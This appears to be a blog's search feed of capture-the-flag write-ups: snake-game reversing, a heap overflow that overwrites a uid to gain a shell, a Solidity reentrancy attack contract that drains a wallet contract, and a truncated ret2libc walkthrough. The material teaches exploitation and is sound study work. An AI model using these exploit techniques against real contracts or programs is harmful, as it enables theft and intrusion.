<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Cyberskills 2022</title>
      <link href="/2022/10/31/cyberskills/"/>
      <url>/2022/10/31/cyberskills/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Cyberskills was a part ctf, part real boring cybersecurity stuff event for highschool students. I was in a mixed team with two good friends of mine. We ended up winning, but as we were a mixed team, we were not eligible for prizes.</p><h3 id="Reversing-Snake-whisperer"><a href="#Reversing-Snake-whisperer" class="headerlink" title="Reversing: Snake whisperer"></a>Reversing: Snake whisperer</h3><p>This was a fun little challenge. Through accessing a webpage, we got the source code for a classic snake game made in pygame. On the webpage we also had an input for a betaskip-code. Looking through the source code we see two interesting functions called <code>loadSecretTextFileBETA</code> and <code>verifyLevelCode</code>. Let’s take a look at <code>loadSecretTextFileBETA</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">loadSecretTextFileBETA</span>(<span class="params">level</span>):                          <span class="comment">#Spændende</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        filePointer = <span class="built_in">open</span>(<span class="string">&quot;./secretScoreBETASKIP.txt&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ruhRoh:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;File likely not found.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    secretCode = filePointer.readline()</span><br><span class="line">    <span class="built_in">print</span>(secretCode)</span><br><span class="line">    level.verifyLevelCode(secretCode)</span><br></pre></td></tr></table></figure><p>We see that it has a comment saying “Interesting” in danish. The function basically opens a textfile called <code>secretScoreBETASKIP.txt</code> and reads the content. Originally the <code>secretScoreBETASKIP.txt</code> file was not part of the source, so when running the game, it would just print “File likely not found”. However, if the filed existed it would call the funcion <code>verifyLevelCode</code> with the contents of <code>secretScoreBETASKIP.txt</code> file as an argument. So let us take a look at <code>verifyLevelCode</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">verifyLevelCode</span>(<span class="params">self, levelCode</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        step1LevelCodeBytes = base64.b64decode(levelCode)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> exe:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    step1LevelCode = step1LevelCodeBytes.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    step2LevelCode = <span class="string">&quot;&quot;</span></span><br><span class="line">    codeSplit = step1LevelCode.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    step1LevelCodeFirstPart = codeSplit[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> step1LevelCodeFirstPart:</span><br><span class="line">        step2LevelCode += <span class="built_in">chr</span>(<span class="built_in">ord</span>(character) - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> step2LevelCode == <span class="string">&quot;snekGaem1337&quot;</span>:</span><br><span class="line">        levelSelector = codeSplit[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.currentLevel = <span class="built_in">int</span>(levelSelector)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> exe:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>The function tries to base64 decode levelCode, which is the contents of <code>secretScoreBETASKIP.txt</code>. This means that we will have to base64 encode whatever we will write into that file. Then it decodes the bytes into an ascii string, and splits the string at a colon. The first part of the decoded content runs through a for loop that subtracts 1 from the ordinal value of each character and saves it in the variable <code>step2LevelCode</code>. Then it checks that <code>step2LevelCode</code> is equal to the string “snekGaem1337”. If they are equal, the level is set to be the number after the colon. This part of the source says what level we need to reach to win:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> level.currentLevel == <span class="number">99</span>: <span class="comment">#This is the win condition but it won&#x27;t return a flag.</span></span><br></pre></td></tr></table></figure><p>So we can write a simple script to get the correct contents of the <code>secretScoreBETASKIP.txt</code> file:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">string = <span class="string">&quot;snekGaem1337&quot;</span></span><br><span class="line"></span><br><span class="line">new = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(string)):</span><br><span class="line">    new += <span class="built_in">chr</span>(<span class="built_in">ord</span>(string[i])+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode((new + <span class="string">&quot;:99&quot;</span>).encode()).decode())</span><br></pre></td></tr></table></figure><p>When pasting the output, which is “dG9mbEhiZm4yNDQ4Ojk5”, into <code>secretScoreBETASKIP.txt</code> and running the game, we reach the win screen. Now we just have to paste “dG9mbEhiZm4yNDQ4Ojk5” into the betaskip part of the website, and we will get our sweet internetpoints.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DownUnderCTF: login</title>
      <link href="/2022/09/24/login/"/>
      <url>/2022/09/24/login/</url>
      
        <content type="html"><![CDATA[<h2 id="Writeup-for-login-from-DownUnderCTF-2022"><a href="#Writeup-for-login-from-DownUnderCTF-2022" class="headerlink" title="Writeup for login from DownUnderCTF 2022"></a>Writeup for login from DownUnderCTF 2022</h2><p>Challenge description:</p><p><code>Free shell for admins!</code></p><p>We are provided with two files, login.c and login. Login.c is the source file and login is the elf file.</p><p>Checking the securities of the binary, we see that all protections are enabled:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/login&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>Checking the source we have some interesting functions. The first one i looked at was the login function:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">login</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> username[USERNAME_LEN];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Username: &quot;</span>);</span><br><span class="line">    read_n_delimited(username, USERNAME_LEN, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_USERS; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(users[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strncmp</span>(users[i]-&gt;username, username, USERNAME_LEN) == <span class="number">0</span>) &#123;</span><br><span class="line">                found = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(users[i]-&gt;uid == <span class="number">0x1337</span>) &#123;</span><br><span class="line">                    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Successfully logged in! uid: 0x%x\n&quot;</span>, users[i]-&gt;uid);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!found) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;User not found&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It checks for some uid, and if it is equal to 0x1337, then we get a shell. At the top of the file we see this:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_USERS 0x8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USERNAME_LEN 0x18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADMIN_UID 0x1337</span></span><br></pre></td></tr></table></figure><p>The ADMIN_UID is 0x1337, the USERNAME_LEN is 0x18. </p><p>We also have a function called add_user:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">add_user</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">user_t</span> user = (<span class="type">user_t</span>) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">user_t</span>));</span><br><span class="line">    users[curr_user_id++ - ADMIN_UID] = user;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Username length: &quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> len = read_int();</span><br><span class="line">    <span class="keyword">if</span>(len &gt; USERNAME_LEN) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Length too large!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!user-&gt;uid) &#123;</span><br><span class="line">        user-&gt;uid = curr_user_id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Username: &quot;</span>);</span><br><span class="line">    read_n_delimited(user-&gt;username, len, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This function sets the uid of our added user to the number of users added to the top of ADMIN_UID. An interesting thing to note is the malloc function. This tells me that we will have to work with the heap. The heap is memory set aside for dynamic allocation. It is very complex, and I don’t fully understand it yet. The read_int function plays a big role in the exploit. We want to “overflow” the heap but the maximum username length is 24 bytes. This isn’t enough to make our overflow. But because of the read_int function, we can just pass a character that isn’t a number, and it will let us pass all of the bytes that we want. Let’s try it and take a look at the heap:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x555555559290: 0x00000000      0x00000000      0x00000021      0x00000000</span><br><span class="line">0x5555555592a0: 0x00001338      0x61616161      0x61616161      0x61616161</span><br><span class="line">0x5555555592b0: 0x61616161      0x61616161      0x61616161      0x61616161</span><br><span class="line">0x5555555592c0: 0x61616161      0x61616161      0x61616161      0x61616161</span><br><span class="line">0x5555555592d0: 0x61616161      0x61616161      0x61616161      0x61616161</span><br><span class="line">0x5555555592e0: 0x61616161      0x61616161      0x61616161      0x61616161</span><br><span class="line">0x5555555592f0: 0x61616161      0x61616161      0x61616161      0x00616161</span><br><span class="line">0x555555559300: 0x00000000      0x00000000      0x00000000      0x00000000</span><br></pre></td></tr></table></figure><p>For this one I filled in a bunch of a’s and we can see them represented as 0x61. We see that the uid of the user is set in the first four bytes. If we can overwrite those bytes for another user, which we can, as the a’s fill as much as we want them to, then we can set the uid of the next user. Neat. But when continuing to run the program after our overflow, we get an error <code>malloc(): corrupted top size</code>. This is because we have filled the heap with a bunch of junk, and now it doesn’t make sense. So we have to send something that looks like another user. Users with a username of three a’s will look like this:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x555555559290: 0x00000000      0x00000000      0x00000021      0x00000000</span><br><span class="line">0x5555555592a0: 0x00001338      0x00616161      0x00000000      0x00000000</span><br><span class="line">0x5555555592b0: 0x00000000      0x00000000      0x00000021      0x00000000</span><br><span class="line">0x5555555592c0: 0x00001339      0x00616161      0x00000000      0x00000000</span><br><span class="line">0x5555555592d0: 0x00000000      0x00000000      0x00020d31      0x00000000</span><br></pre></td></tr></table></figure><p>And they still work. So we can send three a’s, 17 nullbytes, then the 0x00020d31 bytes, which I assume are a pointer for something, I’m not sure. Then 4 nullbytes. Now we begin to overflow the uid of the next user, which is 1339. We want it to be 1337, so we send \x37\x13\x00\x00, and then something to recognise our user, which will be “iiii”. After this the program will still be running, and we can just add a user with a length of 4 bytes and the username of iii. When we login as iii we get our sweet shell. </p><p>This was my first heap based challenge, and it was really fun!</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Writeups for Heroctf 2022</title>
      <link href="/2022/05/29/heroctf/"/>
      <url>/2022/05/29/heroctf/</url>
      
        <content type="html"><![CDATA[<h2 id="Writeup-for-the-web3-challenge-“Let’s-introduce-ourselves”"><a href="#Writeup-for-the-web3-challenge-“Let’s-introduce-ourselves”" class="headerlink" title="Writeup for the web3 challenge “Let’s introduce ourselves”"></a>Writeup for the web3 challenge “Let’s introduce ourselves”</h2><p>For this challenge we have to run the blockchain and connect to it. First off, we have to add the melcoin to our metamask wallet. On the heroctf blockchain they have a tutorial for how it is done:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Add to Metamask</span><br><span class="line"></span><br><span class="line">To add the Herochain to Metamask, follow these steps :</span><br><span class="line">        - Go into Metamask settings -&gt; networks and click on &quot;Add Network&quot;</span><br><span class="line">        - Enter the following informations :</span><br><span class="line">                Network name     : Herochain</span><br><span class="line">                New RPC URL      : http://blockchain.heroctf.fr:8502 OR http://161.97.134.238:8502/</span><br><span class="line">                Chain ID         : 1337</span><br><span class="line">                Currency Symbol  : HERO</span><br><span class="line">                Block explorer   : Leave empty (it would make it too easy right ?)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Now we are connected to the network. We still need some coins, which we can do by going to their faucet site and paste our wallet address. They give us 5 melcoins.</p><p>So for challenge 0 we get this sourcecode:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.13</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// @dev : iHuggsy</span></span><br><span class="line">contract Introduction</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">        Before going into the source code, make sure you visited http://blockchain.heroctf.fr:22000/help if you need it !</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        THERE IS ONE (1) RULE :</span></span><br><span class="line"><span class="comment">            - The whole node system and mining system (and machines that are part of this system) </span></span><br><span class="line"><span class="comment">              does not belong to ANY of the challenges, any attempt to use them in a </span></span><br><span class="line"><span class="comment">              way that is not considered normal in a blockchain environment, pentest them </span></span><br><span class="line"><span class="comment">              or even scan them WILL result in a ban of your entire team without any notice.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        By interacting with the `accept_rules` function that follows, you are signing a contract </span></span><br><span class="line"><span class="comment">        that you agree with the rule.</span></span><br><span class="line"><span class="comment">        (Even if you don&#x27;t interact with it, you agree to it lol)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        Have a good one !</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        If you run into any problem, feel free to DM me on the Discord </span></span><br><span class="line"><span class="comment">        @dev : iHuggsy</span></span><br><span class="line"><span class="comment">    **/</span></span><br><span class="line"></span><br><span class="line">    bytes32 flags;</span><br><span class="line">    <span class="built_in">mapping</span> (address =&gt; <span class="type">bool</span>) accepted_rules;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">constructor</span> (bytes32 _flagz)</span><br><span class="line">    &#123;</span><br><span class="line">        flags = _flagz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">get_flag_part_one</span><span class="params">()</span> external view <span class="title">returns</span> <span class="params">(bytes32)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(accepted_rules[msg.sender] == <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> flags;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">accept_rules</span><span class="params">()</span> external</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        accepted_rules[msg.sender] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>We can deploy the contract from the heroctf blockchain site. If we paste the sourcecode into Remix and compile, we can go to the <code>Deploy &amp; run transactions</code> and connect with Metamask and then run the contract from the address, which we get on the heroctf blockchain site. Then we just have to agree to the rules and get our flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">decoded output:</span><br><span class="line">&#123;</span><br><span class="line">&quot;0&quot;: &quot;bytes32: 0x4865726f7b57336c43306d655f325f48337230436834316e5f5740674d317d00&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Decoding the hexstring gives the flag.<br><br><br><br></p><h2 id="Writeup-for-the-web3-challenge-“Ready-to-hack”"><a href="#Writeup-for-the-web3-challenge-“Ready-to-hack”" class="headerlink" title="Writeup for the web3 challenge “Ready to hack”"></a>Writeup for the web3 challenge “Ready to hack”</h2><p>Prompt:<br>Now that we’re introduced, let’s jump into it. this contract acts like a wrapper around $MEL.<br>We can’t say it holds a gigantic amount of money, but it might be a kickstarter for you!<br>Of course, the ontract belongs to a malicious organization, which is why we’re hacking it.<br>Don’t hack legit organizations.<br>Empty the contract from it’s mooney to get the flag.</p><p>Now we actually have to do something with the knowledge gained from the introduction. We get the sourcecode to the contract from the heroctf blockchain site:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.13</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    This contract implements &quot;WMEL&quot; (Wrapped MEL). You get an ERC20 version of Melcoin where 1WMEL == 1MEL at all times.</span></span><br><span class="line"><span class="comment">    This is a beta version !</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// @dev : iHuggsy</span></span><br><span class="line">contract WMEL</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">mapping</span>(address =&gt; uint) <span class="keyword">public</span> balances;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">constructor</span> () payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">deposit</span><span class="params">()</span> external payable </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">withdraw</span><span class="params">()</span> <span class="keyword">public</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        uint bal = balances[msg.sender];</span><br><span class="line">        <span class="built_in">require</span>(bal &gt; <span class="number">0</span>);</span><br><span class="line">        (<span class="type">bool</span> sent, ) = msg.sender.call&#123;value: bal&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(sent, <span class="string">&quot;Failed to send Ether&quot;</span>);</span><br><span class="line">        balances[msg.sender] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Helper function to check the balance of this contract</span></span><br><span class="line">    <span class="function">function <span class="title">getBalance</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">address</span>(<span class="keyword">this</span>).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>This contract holds some melcoins and we want to empty the contract to get the flag. We see two functions and a helper function. The helper function only lets us see how many melcoins are left on the contract. <code>mapping(address =&gt; uint) public balances;</code> is where the users balance is stored. In the deposit function the balances variable is increased with the users value. Lets get to know the withdraw function. The withdraw function sets an unsigned integer as bal, which is equal to the users balance. Then it checks that bal is larger than 0. If bal is larger than 0 it calls the fallback function of msg.sender with the value of bal, and afterwards it sets the bal back to 0. </p><p>Because the contract makes the transaction before setting our balance to zero, it is vulnerable to a reentrancy attack, which is what we will exploit. We can create another smart contract, which will attack the original smart contract. This is what my exploit contract looked like:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.13</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./target.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    WMEL <span class="keyword">public</span> bank;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">constructor</span>(address _bankAddress) &#123;</span><br><span class="line">        bank = <span class="built_in">WMEL</span>(_bankAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fallback</span>() external payable &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">address</span>(bank).balance &gt;= <span class="number">1</span> ether) &#123;</span><br><span class="line">            bank.<span class="built_in">withdraw</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">attack</span><span class="params">()</span> external payable </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.value &gt;= <span class="number">1</span> ether);</span><br><span class="line">        bank.deposit&#123;value: <span class="number">1</span> ether&#125;();</span><br><span class="line">        bank.<span class="built_in">withdraw</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When deploying it and calling the <code>attack</code> function with a value of 1 ether the ether will start flowing and the smart contract is empty. Now we just need to verify on the website, and then we’ll be rewarded with a cool flag.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Writeups til DDC 2022</title>
      <link href="/2022/05/08/ddc/"/>
      <url>/2022/05/08/ddc/</url>
      
        <content type="html"><![CDATA[<h2 id="Writeup-for-the-pwn-challenge-“Parking-Agent”-from-DDC"><a href="#Writeup-for-the-pwn-challenge-“Parking-Agent”-from-DDC" class="headerlink" title="Writeup for the pwn challenge “Parking Agent” from DDC"></a>Writeup for the pwn challenge “Parking Agent” from DDC</h2><p>So we get an elf file, the libc.so.6 that belongs to it, and we also get the source code for the binary. The elf file is a 64-bit, and it isn’t stripped. The are no securities on it other than NX is enabled. So no shellcode. The sourcecode for the binary looked like this:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv[])</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello to the DDC parking! Would you like to park here? Its %p$ an hour\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">  gets(buf);</span><br></pre></td></tr></table></figure><p>It’s really simple and there not really a lot of stuff going on. We have a buffer of 64 bytes, so our padding should be 72 bytes because we also need to file the base pointer <code>rbp</code> with 8 bytes. Then the program prints some stuff and it prints the address of printf. That’s useful. Then we get to the vulnerability. The <code>gets</code> function, which doesn’t stop reading characters from input, is used. So it’s a ret2libc challenge. I have never done a ret2libc challenge before, so this was my first one. Let’s get to it.</p><p>By using the provided address of printf, we have to calculate the baseaddress of libc. From then on we can find a <code>/bin/sh</code> and a call to system in the libc. Other than that we need a <code>pop rdi</code> gadget.</p><p>We need to set the correct libc in our pwntools script. This can be done by <code>libc = ELF(&#39;/address/to/libc.so.6&#39;)</code>. To find the address, the tool ldd is helpful.</p><p>We also need to do some math, to calculate the baseaddress of libc. So we read the address of <code>printf</code>. In pwntools we can then do something like this:</p><figure class="highlight python"><table><tr><td 